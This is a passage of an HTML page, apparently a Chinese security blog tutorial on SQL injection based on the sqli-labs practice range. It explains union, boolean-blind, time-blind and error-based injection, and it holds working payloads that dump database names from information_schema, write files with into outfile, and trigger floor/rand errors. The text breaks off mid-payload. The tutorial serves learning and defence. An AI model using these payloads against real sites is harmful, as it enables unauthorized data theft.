@@ -1,0 +1,1834 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+
+  
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-corner-indicator.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sql注入," />
+
+
+
+
+
+  <link rel="alternate" href="/%5Bobject%20Object%5D" title="quan9i's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="少年游,踏浪回首，万千冬藏一春柔。 前言在sqli-labs靶场中学过一点sql注入，最近遇到了很多此类题目，对sql注入进行了进一步的学习，汇总如下，希望能对正在学习的各位师傅们有所帮助 漏洞相关信息漏洞成因程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 定义web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的 SQ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅析sql注入">
+<meta property="og:url" content="https://quan9i.top/sqlzhuru/index.html">
+<meta property="og:site_name" content="quan9i&#39;s blog">
+<meta property="og:description" content="少年游,踏浪回首，万千冬藏一春柔。 前言在sqli-labs靶场中学过一点sql注入，最近遇到了很多此类题目，对sql注入进行了进一步的学习，汇总如下，希望能对正在学习的各位师傅们有所帮助 漏洞相关信息漏洞成因程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 定义web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的 SQ">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/75922d491ae74793920c08fc519975ba.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/cfbb9c06e4f4430da25abf814872cb9e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/96cb2f01beaf4ee3b1043a5eb84399a3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/04d670d9bd164fd2a4850085af2800c5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f132ac0f080949c8a6ee50204d390414.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/de4f74e08850cf4d083762057f5d69c0.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4c573407e48247cfb99fc73ad9998302.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/abc8c30289f4450bb5dd6eb583fdf6a0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0fe00a81884b4542bbce3bd65c108868.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5a904bd24f22461e80ca25aec71acfc7.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0c0682259f6147878a7e0432bed0fa44.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/42d30e7216d64156b25ab1c0e4d82dc8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/622f291f79f4483b99dd47e3b6eb6fcc.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d690660f35d54e45af4f2fe5aef453e3.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/134b5007ceb743f1b6fc7a4b1b614fd6.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e3431cae2e3c4d779ecb42e99a1aecd5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a0553e0b53554bdd912bf9ef02a2130a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7344160f496f4e95bdf618f100b8f75b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/790301662c5b4ba188347d1c48334a89.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1b5699aaaef04603b1e0d6dba02af600.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6496610727ad4d26bbad5b92a3a42882.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a899db0033c94e77b44e083152fc955d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/729147c6c0cc428bb44aa793513cef86.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/be0aa49858af4192ae79e6094a70467d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4b3fb815a92e42159c7eb76594d1330a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9ecedccc793048ffa47057e5c9e726d7.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0fe00a81884b4542bbce3bd65c108868.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/077c87b27294433c981d5e899962591d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b98dfefd435c40f9b7342d62457b4822.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/dc494b291314429c9ebb4b9e21f9cacc.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7202c93f86f649a993e41dfbc2f550d5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7a830df3539647b49407dc9a6ec3c951.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3599754c73bf4a7f8e6b80bfec197c3b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6974361e9a1540ae88b261671a99207e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b39c2c8a9707415196317d5f32583027.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/da3a3d8b031140eb8290f2dfd156c61a.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ade61852b2164432a633258171c71d19.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f0d15e4709e84dbdbfcc420fa433c868.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3b4e215c6cb84794baca09dec859bd83.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/21a3f73802ee46bb924e99443d0a6b6d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b012f18368f34adfaf618d5b9402d4ed.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/172fe8ed5af247e193bc41b19927e759.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f615d20060a542f69f73ec12a7b2f639.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/44d9cd5f11734a4ea22f287043bcde90.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/bac285ef04ed458491906732cebc559c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7e9182768a6d40859295733d5ca07588.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/76c1f9ab27954f09872486074f066392.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5345d1aa85ae43209070fbbfe9453555.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3b04cc57f22d44fa9896d6326124b298.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e82186b3da214199b1983c1572ffd6a5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/14dba507c8fc4a72ae201ef26c5f12c5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/f2157307c46143f2879df89b081d3b93.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7800e01396424054953e125df194c6b8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7f33134ead024b549dab8869665c12c8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a7b4acf061d24c22ac399c7fffb41ee2.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/46f79a80c5f0427da2a0cd2b417b07c5.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e08f9ed9db5d41cea4c9c21d938d1bf8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0d298175f313497a99eb0d25a01ffbbd.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/75f8b2e50c074d9396b934b7aabcc7a2.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0fb2fe76f47345a4b92d7a7876053aa9.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9fd73725d97747ebb47e499946f7b59c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e04bcab89edd47c2b188b989df6fec88.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d12809bd6a924f3d9e61cbb00e8118e0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/961ff91a8d114ef09f6a4503af473646.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3313691932df49a98a2e2a46d8b2309d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/84cd1c054c894166a5c49c3d4463d945.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e6dfe25f54c542e5a846e0e32d7eb0fe.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/bf58a76e25cd4837b555fef23f127039.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3d2cc47099f3497e8e0df9f3849fe7c0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/06a29bab43c44871902077a864dad95b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9ea5b590215a4524afdb53e7f2528ed9.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ed3daedc5d54416183e9cd20311658ea.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/922d8e99e71d4a97bcb9b1a6fcdc8699.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/83116aad07694e2eb61e29a28bd2403c.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/aa22caac7c784336806a36607d36d1a8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8ee0996ecf7d44e9a1f6ffc51901ba9d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/4cdc3c616a3c49e1bdf29c8320555a76.png">
+<meta property="article:published_time" content="2022-04-01T16:00:41.799Z">
+<meta property="article:modified_time" content="2022-04-07T10:13:39.854Z">
+<meta property="article:author" content="quan9i">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/75922d491ae74793920c08fc519975ba.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://quan9i.top/sqlzhuru/"/>
+
+
+
+
+
+  <title>浅析sql注入 | quan9i's blog</title>
+  
+
+
+
+
+
+
+
+
+
+    <!--pjax：防止跳转页面音乐暂停-->
+  <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script> 
+<meta name="generator" content="Hexo 5.4.0"><style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}</style></head>
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">quan9i's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">少年有梦不应止于心动 更要付诸 行动</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-star-half-o"></i> <br />
+            
+            精选文案
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-liuyan">
+          <a href="/liuyan/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友链
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-zanshang">
+          <a href="/zanshang/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-rocket"></i> <br />
+            
+            赞赏
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+<script src="/live2d-widget/autoload.js"></script>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://quan9i.top/sqlzhuru/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/2.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="quan9i's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">浅析sql注入</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-04-02T00:00:41+08:00">
+                2022-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">sql注入</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/sqlzhuru/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/sqlzhuru/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  10.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  43
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://img-blog.csdnimg.cn/75922d491ae74793920c08fc519975ba.png" alt="在这里插入图片描述"><br>少年游,踏浪回首，万千冬藏一春柔。</p>
+<h1><span id="前言">前言</span></h1><p>在sqli-labs靶场中学过一点sql注入，最近遇到了很多此类题目，对sql注入进行了进一步的学习，汇总如下，希望能对正在学习的各位师傅们有所帮助</p>
+<h1><span id="漏洞相关信息">漏洞相关信息</span></h1><h2><span id="漏洞成因">漏洞成因</span></h2><p>程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
+<h2><span id="定义">定义</span></h2><p>web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的 SQL语句 ，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+<p>简单理解：前端的恶意语句插入到后端的服务器中，成功运行了攻击者想要执行的操作</p>
+<h2><span id="漏洞危害">漏洞危害</span></h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。</span><br><span class="line"></span><br><span class="line">2.对数据库的数据进行增加或删除操作，例如删除数据库中重要数据的表。</span><br><span class="line"></span><br><span class="line">3.如果网站目录存在写入权限，那么攻击者可以对网页进行篡改，发布一些违法信息等。</span><br><span class="line"></span><br><span class="line">4.获取服务器最高权限，远程控制服务器，安装后门，从而修改或控制操作系统。</span><br></pre></td></tr></table></figure>
+<h1><span id="sql注入常见类型按照执行效果分类">sql注入常见类型（按照执行效果分类）</span></h1><h2><span id="联合查询注入">联合查询注入</span></h2><p>联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起。<br>简单的说，就是union可合并两个及以上select语句的结果集。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">前提：</span><br><span class="line">（<span class="number">1</span>）这几个<span class="keyword">select</span>语句必须拥有相同列，而且各列的数据类型也相同。</span><br><span class="line">（<span class="number">2</span>）必须有显示位</span><br></pre></td></tr></table></figure>
+
+<p>什么是显示位？<br>官方的说就是执行的sql语句得到的数据会显示到界面上去，在界面上显示数据的这个位置就称位显示位<br>简单的说就是在界面上有回显，如下图这种情况无论输入什么都显示 you are in ，此即说明不存在显示位<br><img src="https://img-blog.csdnimg.cn/cfbb9c06e4f4430da25abf814872cb9e.png" alt="在这里插入图片描述"></p>
+<p>2、查询语句使用的多为union select 语句<br>union select 在查询数据库，查询列名以及查询字段信息时候都被用到，示例如下：<br>代码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>n<span class="string">&#x27; union select 1,group_concat(schema_name) from information_schema.schemata  #&amp;passwd=admin&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/96cb2f01beaf4ee3b1043a5eb84399a3.png" alt="在这里插入图片描述"><br>3、union select 1,2,3的含义<br>查询字段时，经常用到union select 1，2，3 这是因为 1，2，3会对应到数据库中，先查询数据库中的数据，再来输出1，2，3<br>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;))  union select 1,2,3 from security.users into outfile &quot;D:\\1.txt&quot; --+</span></span><br></pre></td></tr></table></figure>
+
+<p>输出结果<br><img src="https://img-blog.csdnimg.cn/04d670d9bd164fd2a4850085af2800c5.png" alt="在这里插入图片描述"></p>
+<p>示例2：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">: uname<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata#</span></span><br></pre></td></tr></table></figure>
+<p>爆出了数据库名<br><img src="https://img-blog.csdnimg.cn/f132ac0f080949c8a6ee50204d390414.png" alt="在这里插入图片描述"></p>
+<h2><span id="布尔盲注">布尔盲注</span></h2><p>在SQL注入过程中，执行正确时应用程序返回的是固定界面(正确执行和错误执行的界面是不同的)。这时，我们无法根据应用程序的回显得到我们需要的数据库信息。但是可以通过构造逻辑判断来得到我们需要的信息。<br>布尔盲注一般常用的函数为length()、substr()和ascii()函数。在这里对函数进行简单介绍</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">length():函数返回字符串str的长度，以字节为单位。</span><br><span class="line">substr(str,pos,len):函数从特定位置开始的字符串返回一个给定长度的子字符串</span><br><span class="line">        str参数代表待截取的字符串</span><br><span class="line">        pos参数代表从什么位置开始截取</span><br><span class="line">        len参数表示字符串截取的长度</span><br><span class="line">ascii()：函数输出某个字符的ascii码值</span><br></pre></td></tr></table></figure>
+<h2><span id="时间盲注">时间盲注</span></h2><p>在SQL注入过程中，执行正确时应用程序返回的是固定界面(正确执行和错误执行的界面是相同的，界面一成不变)。这时我们可利用延时函数让 mysql 执行时间变长，进而判断出执行的语句是否正确<br>时间盲注常用的函数为if()，sleep(), benchmark()函数，在这里对函数进行简单介绍</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(x,x1,x2):x是条件，当条件执行结果为<span class="literal">true</span>时，就执行x1,否则执行x2</span><br><span class="line">sleep(t):暂停t秒执行，假如里面是<span class="number">1</span>，其含义就是延时<span class="number">1</span>秒</span><br><span class="line">benchmark(t,y):对y的性能计算t次，返回结果为<span class="number">0</span></span><br><span class="line">举个例子benchmark(<span class="number">5000000</span>,sha(<span class="number">1</span>)，这句话的含义是对sha(<span class="number">1</span>)进行性能测试，测试次数为<span class="number">5000000</span>次，</span><br><span class="line">其最终输出结果为<span class="number">0</span>，但是计算性能时间超过<span class="number">1</span>秒了，因此从这里来说可以起到替代sleep的作用</span><br></pre></td></tr></table></figure>
+<h2><span id="报错注入">报错注入</span></h2><p>当web程序无法使用联合查询，但输入错误语句存在报错的时候，这时候我们就可以尝试用报错注入。</p>
+<p>报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。简单点说，就是在可以进行sql注入的位置，调用特殊的函数执行，利用函数报错使其输出错误结果来获取数据库的相关信息</p>
+<p>前提在上方已经提过，就是<code>界面可以回显错误信息</code></p>
+<p>常用的函数是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">updatexml(XML_document,Xpath_string,new_value):函数利用mysql函数参数格式错误进行报错注入</span><br><span class="line">        XML_document:是字符串String格式，为XML文档对象名称</span><br><span class="line">        Xpath_string:Xpath格式的字符串</span><br><span class="line">        new_value:string格式，替换查找到的符合条件的数据</span><br><span class="line">extractvalue(XML_document,XPath_string):同样是利用xpath语法错误来进行报错注入</span><br><span class="line">下方四个通常是联用的，这种报错的原因是主键重复</span><br><span class="line">rand()：随机输出<span class="number">0</span>到<span class="number">1</span>之间的数</span><br><span class="line"><span class="built_in">floor</span>():对括号内的数进行向下取整，比如<span class="number">1.9187</span>取为<span class="number">1</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> x:分组语句</span><br><span class="line"><span class="built_in">count</span>():汇总语句，如果括号里面是<span class="operator">*</span>就是将全部汇总</span><br></pre></td></tr></table></figure>
+<p>这里举出一些payload例子及少见的报错函数(3之后是不常用的少见注入函数)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> floor <span class="operator">+</span> rand <span class="operator">+</span> <span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(version(),<span class="built_in">floor</span>(rand(<span 